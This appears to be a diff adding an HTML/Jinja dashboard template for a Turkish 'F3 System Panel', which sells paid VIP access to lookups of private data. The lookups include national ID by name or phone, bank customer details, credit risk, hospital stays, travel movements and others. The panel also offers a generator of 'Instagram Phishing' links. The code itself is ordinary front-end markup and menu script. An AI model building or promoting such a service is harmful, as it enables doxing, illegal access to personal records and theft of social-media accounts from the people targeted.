+                        Vergi Borç Sorgu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('tapu_gayrimenkul')">
+                        <i class="fas fa-home subcategory-icon"></i>
+                        Tapu Gayrimenkul
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('askerlik_durum')">
+                        <i class="fas fa-user-shield subcategory-icon"></i>
+                        Askerlik Durumu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('su_fatura')">
+                        <i class="fas fa-tint subcategory-icon"></i>
+                        Su Faturası
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('elektrik_fatura')">
+                        <i class="fas fa-bolt subcategory-icon"></i>
+                        Elektrik Faturası
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('otel_rezervasyon')">
+                        <i class="fas fa-hotel subcategory-icon"></i>
+                        Otel Rezervasyon
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('istanbulkart_bakiye')">
+                        <i class="fas fa-bus subcategory-icon"></i>
+                        İstanbulkart Bakiye
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('spor_federasyon')">
+                        <i class="fas fa-running subcategory-icon"></i>
+                        Spor Federasyon Kaydı
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('kutuphane_uye')">
+                        <i class="fas fa-book subcategory-icon"></i>
+                        Kütüphane Üye Durumu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('hasta_yatis')">
+                        <i class="fas fa-procedures subcategory-icon"></i>
+                        Hasta Yatış Geçmişi
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('banka_musteri')">
+                        <i class="fas fa-university subcategory-icon"></i>
+                        Banka Müşteri Bilgisi
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('kredi_risk')">
+                        <i class="fas fa-chart-line subcategory-icon"></i>
+                        Kredi Risk Raporu
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('meb_mezuniyet')">
+                        <i class="fas fa-graduation-cap subcategory-icon"></i>
+                        MEB Mezuniyet
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('ticaret_sikayet')">
+                        <i class="fas fa-comment-alt subcategory-icon"></i>
+                        Ticaret Şikayet Kaydı
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('cevre_ceza')">
+                        <i class="fas fa-tree subcategory-icon"></i>
+                        Çevre Ceza
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('noter_islem')">
+                        <i class="fas fa-file-signature subcategory-icon"></i>
+                        Noter İşlem
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('avci_lisans')">
+                        <i class="fas fa-bow-arrow subcategory-icon"></i>
+                        Avcı Lisans
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('ucak_bilet')">
+                        <i class="fas fa-plane subcategory-icon"></i>
+                        Uçak Bileti
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                    <div class="subcategory-item" onclick="goToApi('seyahat_hareket')">
+                        <i class="fas fa-road subcategory-icon"></i>
+                        Seyahat Hareket
+                        <span class="badge vip-badge"><i class="fas fa-crown"></i> VIP</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Ana İçerik -->
+        <div class="main-content">
+            <!-- Üst Navbar -->
+            <div class="navbar">
+                <div class="left-nav">
+                    <div class="logo">F3 SYSTEM PANEL</div>
+                    <div class="logo-subtitle">Premium Sorgu Platformu</div>
+                </div>
+                <div class="right-nav">
+                    <div class="nav-icon">
+                        <i class="fas fa-search"></i>
+                    </div>
+                    <div class="nav-icon">
+                        <i class="fas fa-shopping-cart"></i>
+                        <div class="notification-badge"></div>
+                    </div>
+                    <div class="nav-icon">
+                        <i class="fas fa-bell"></i>
+                        <div class="notification-badge"></div>
+                    </div>
+                    <div class="nav-icon">
+                        <i class="fas fa-user"></i>
+                    </div>
+                    <button class="menu-toggle" id="menuToggle">
+                        <i class="fas fa-bars"></i>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Dashboard İçeriği -->
+            <div class="dashboard-content">
+                <div class="welcome-section">
+                    <h1 class="welcome-title">Hoş Geldiniz, {{ username }}!</h1>
+                    <p class="welcome-subtitle">F3 System Panel'in gücünü keşfedin. {{ total_apis }}+ API, {{ user_apis }}+ sorgu seçeneği ile premium hizmet.</p>
+                </div>
+
+                <div class="dashboard-cards">
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-icon">
+                                <i class="fas fa-search"></i>
+                            </div>
+                            <div class="card-title">Bugünkü Sorgular</div>
+                        </div>
+                        <div class="card-value">{{ today_calls }}</div>
+                        <div class="card-footer">
+                            <span>Toplam: {{ key.usage_count }}</span>
+                            <span class="positive"><i class="fas fa-chart-line"></i> Aktif</span>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-icon">
+                                <i class="fas fa-key"></i>
+                            </div>
+                            <div class="card-title">Key Planı</div>
+                        </div>
+                        <div class="card-value">{{ plan_name }}</div>
+                        <div class="card-footer">
+                            <span>Key: {{ key.key[:8] }}...</span>
+                            <span class="{{ 'positive' if is_vip else 'warning' }}">
+                                <i class="{{ 'fas fa-crown' if is_vip else 'fas fa-user' }}"></i> {{ 'VIP' if is_vip else 'FREE' }}
+                            </span>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-icon">
+                                <i class="fas fa-calendar-alt"></i>
+                            </div>
+                            <div class="card-title">Kalan Süre</div>
+                        </div>
+                        <div class="card-value">{{ remaining }}</div>
+                        <div class="card-footer">
+                            <span>Son kullanım: {{ key.last_used.strftime('%d/%m/%Y') if key.last_used else 'Hiç' }}</span>
+                            <span class="positive"><i class="fas fa-clock"></i> Aktif</span>
+                        </div>
+                    </div>
+
+                    <div class="card">
+                        <div class="card-header">
+                            <div class="card-icon">
+                                <i class="fas fa-chart-pie"></i>
+                            </div>
+                            <div class="card-title">API Erişimi</div>
+                        </div>
+                        <div class="card-value">{{ user_apis }}/{{ total_apis }}</div>
+                        <div class="card-footer">
+                            <span>{{ free_apis }} Free, {{ vip_apis }} VIP</span>
+                            <span class="{{ 'positive' if is_vip else 'warning' }}">
+                                <i class="fas fa-{{ 'check-circle' if is_vip else 'exclamation-circle' }}"></i> {{ 'Full Erişim' if is_vip else 'Kısıtlı' }}
+                            </span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="quick-actions">
+                    <h2 class="section-title">
+                        <i class="fas fa-bolt"></i>
+                        Hızlı İşlemler
+                    </h2>
+                    <div class="actions-grid">
+                        <a href="abonelik.html" class="action-btn">
+                            <div class="action-icon">
+                                <i class="fas fa-shopping-cart"></i>
+                            </div>
+                            <div class="action-title">Market</div>
+                            <div class="action-desc">Sorgu paketleri satın al</div>
+                        </a>
+
+                        <a href="#" class="action-btn" onclick="goToApi('adsoyad')">
+                            <div class="action-icon">
+                                <i class="fas fa-user"></i>
+                            </div>
+                            <div class="action-title">Ad Soyad TC</div>
+                            <div class="action-desc">Ad Soyad ile TC sorgula</div>
+                        </a>
+
+                        <a href="#" class="action-btn" onclick="goToApi('gsmtc')">
+                            <div class="action-icon">
+                                <i class="fas fa-phone"></i>
+                            </div>
+                            <div class="action-title">GSM → TC</div>
+                            <div class="action-desc">GSM ile TC sorgula</div>
+                        </a>
+
+                        <a href="#" class="action-btn" onclick="{{ "goToApi('phishing_instagram')" if is_vip else "showVipAlert()" }}">
+                            <div class="action-icon">
+                                <i class="fab fa-instagram"></i>
+                            </div>
+                            <div class="action-title">Instagram Phishing</div>
+                            <div class="action-desc">Instagram için phishing link</div>
+                        </a>
+                    </div>
+                </div>
+
+                {% if is_vip %}
+                <div class="premium-solutions">
+                    <div class="premium-header">
+                        <div class="premium-icon">
+                            <i class="fas fa-crown"></i>
+                        </div>
+                        <div class="premium-title">VIP API'leriniz Aktif!</div>
+                    </div>
+                    <div class="premium-grid">
+                        <div class="premium-item" onclick="goToApi('phishing_instagram')">
+                            <div class="premium-item-icon">
+                                <i class="fab fa-instagram"></i>
+                            </div>
+                            <div class="premium-item-title">Instagram Phishing</div>
+                        </div>
+                        <div class="premium-item" onclick="goToApi('papara')">
+                            <div class="premium-item-icon">
+                                <i class="fas fa-money-bill-wave"></i>
+                            </div>
+                            <div class="premium-item-title">Papara Sorgulama</div>
+                        </div>
+                        <div class="premium-item" onclick="goToApi('nufus')">
+                            <div class="premium-item-icon">
+                                <i class="fas fa-users"></i>
+                            </div>
+                            <div class="premium-item-title">Nüfus Sorgulama</div>
+                        </div>
+                        <div class="premium-item" onclick="goToApi('plaka')">
+                            <div class="premium-item-icon">
+                                <i class="fas fa-car"></i>
+                            </div>
+                            <div class="premium-item-title">Plaka Sorgulama</div>
+                        </div>
+                    </div>
+                </div>
+                {% else %}
+                <div class="premium-solutions" style="border-color: var(--free-color);">
+                    <div class="premium-header">
+                        <div class="premium-icon" style="background-color: rgba(139, 92, 246, 0.1); color: var(--free-color);">
+                            <i class="fas fa-arrow-up"></i>
+                        </div>
+                        <div class="premium-title" style="color: var(--free-color);">VIP'e Yükseltin!</div>
+                    </div>
+                    <div class="premium-grid">
+                        <div class="premium-item" style="border-color: rgba(139, 92, 246, 0.3);" onclick="window.location.href='/abonelik.html'">
+                            <div class="premium-item-icon" style="background-color: rgba(139, 92, 246, 0.1); color: var(--free-color);">
+                                <i class="fas fa-crown"></i>
+                            </div>
+                            <div class="premium-item-title">VIP'e Yükselt</div>
+                        </div>
+                        <div class="premium-item" style="border-color: rgba(139, 92, 246, 0.3);">
+                            <div class="premium-item-icon" style="background-color: rgba(139, 92, 246, 0.1); color: var(--free-color);">
+                                <i class="fas fa-unlock"></i>
+                            </div>
+                            <div class="premium-item-title">{{ vip_apis }}+ VIP API Kilidi</div>
+                        </div>
+                        <div class="premium-item" style="border-color: rgba(139, 92, 246, 0.3);">
+                            <div class="premium-item-icon" style="background-color: rgba(139, 92, 246, 0.1); color: var(--free-color);">
+                                <i class="fas fa-bolt"></i>
+                            </div>
+                            <div class="premium-item-title">Hızlı Sorgular</div>
+                        </div>
+                        <div class="premium-item" style="border-color: rgba(139, 92, 246, 0.3);">
+                            <div class="premium-item-icon" style="background-color: rgba(139, 92, 246, 0.1); color: var(--free-color);">
+                                <i class="fas fa-shield-alt"></i>
+                            </div>
+                            <div class="premium-item-title">Gelişmiş Güvenlik</div>
+                        </div>
+                    </div>
+                </div>
+                {% endif %}
+
+                <!-- Kullanıcı Bilgileri -->
+                <div style="margin-top: 30px; padding: 20px; background: var(--secondary-color); border-radius: 12px; border: 1px solid var(--border-color);">
+                    <h3 style="margin-bottom: 15px; color: var(--text-accent);"><i class="fas fa-info-circle"></i> Kullanıcı Bilgileri</h3>
+                    <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px;">
+                        <div>
+                            <small style="color: var(--text-secondary);">IP Adresiniz:</small>
+                            <div style="font-weight: 600;">{{ user_ip }}</div>
+                        </div>
+                        <div>
+                            <small style="color: var(--text-secondary);">Son Giriş:</small>
+                            <div style="font-weight: 600;">{{ last_login.strftime('%d/%m/%Y %H:%M') if last_login else 'Bilinmiyor' }}</div>
+                        </div>
+                        <div>
+                            <small style="color: var(--text-secondary);">Son API Kullanımı:</small>
+                            <div style="font-weight: 600;">{{ last_api.strftime('%d/%m/%Y %H:%M') if last_api else 'Henüz yok' }}</div>
+                        </div>
+                        <div>
+                            <small style="color: var(--text-secondary);">FREE Key:</small>
+                            <div style="font-weight: 600; font-family: monospace; color: var(--free-color);">{{ free_key }}</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Mobil Overlay -->
+        <div class="overlay" id="overlay"></div>
+    </div>
+
+    <script>
+        // Menü açma/kapatma
+        const menuToggle = document.getElementById('menuToggle');
+        const sidebar = document.getElementById('sidebar');
+        const overlay = document.getElementById('overlay');
+
+        // Tüm kategori öğeleri
+        const categoryItems = document.querySelectorAll('.category-item');
+
+        // Menü aç/kapa
+        menuToggle.addEventListener('click', () => {
+            sidebar.classList.toggle('active');
+            overlay.classList.toggle('active');
+        });
+
+        // Overlay tıklanınca menüyü kapat
+        overlay.addEventListener('click', () => {
+            sidebar.classList.remove('active');
+            overlay.classList.remove('active');
+        });
+
+        // Kategori açma/kapama
+        categoryItems.forEach(item => {
+            item.addEventListener('click', function(e) {
+                // Alt menü öğelerine tıklanırsa işlem yapma
+                if (e.target.closest('.subcategory-item')) {
+                    return;
+                }
+
+                // Ok simgesini bul
+                const arrow = this.querySelector('.category-arrow');
+
+                // Eğer bu kategori zaten açıksa
+                if (this.classList.contains('expanded')) {
+                    // Kapat
+                    this.classList.remove('expanded');
+                    if (arrow) arrow.innerHTML = '<i class="fas fa-chevron-right"></i>';
+                } else {
+                    // Önce diğer kategorileri kapat
+                    categoryItems.forEach(otherItem => {
+                        if (otherItem !== this) {
+                            otherItem.classList.remove('expanded');
+                            const otherArrow = otherItem.querySelector('.category-arrow');
+                            if (otherArrow) otherArrow.innerHTML = '<i class="fas fa-chevron-right"></i>';
+                        }
+                    });
+
+                    // Bu kategoriyi aç
+                    this.classList.add('expanded');
+                    if (arrow) arrow.innerHTML = '<i class="fas fa-chevron-down"></i>';
+                }
+            });
+        });
+
+        // Alt menü öğelerine tıklama
+        function goToApi(apiName) {
+            window.location.href = `/sorgu.html?api=${apiName}`;
+        }
+
+        // VIP uyarısı göster
+        function showVipAlert() {
+            alert('Bu API sadece VIP üyeler içindir. Lütfen VIP\'e yükseltin.');
+            window.location.href = '/abonelik.html';
+        }
+
+        // Sayfa yüklendiğinde mobilde menüyü kontrol et
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.innerWidth <= 992) {
+                sidebar.classList.remove('active');
+                overlay.classList.remove('active');
+            }
+        });
+
+        // Mobilde menüyü kontrol et
+        window.addEventListener('resize', () => {
+            if (window.innerWidth > 992) {
+                sidebar.classList.remove('active');
+                overlay.classList.remove('active');
+            }
+        });
+    </script>
+</body>
+</html>
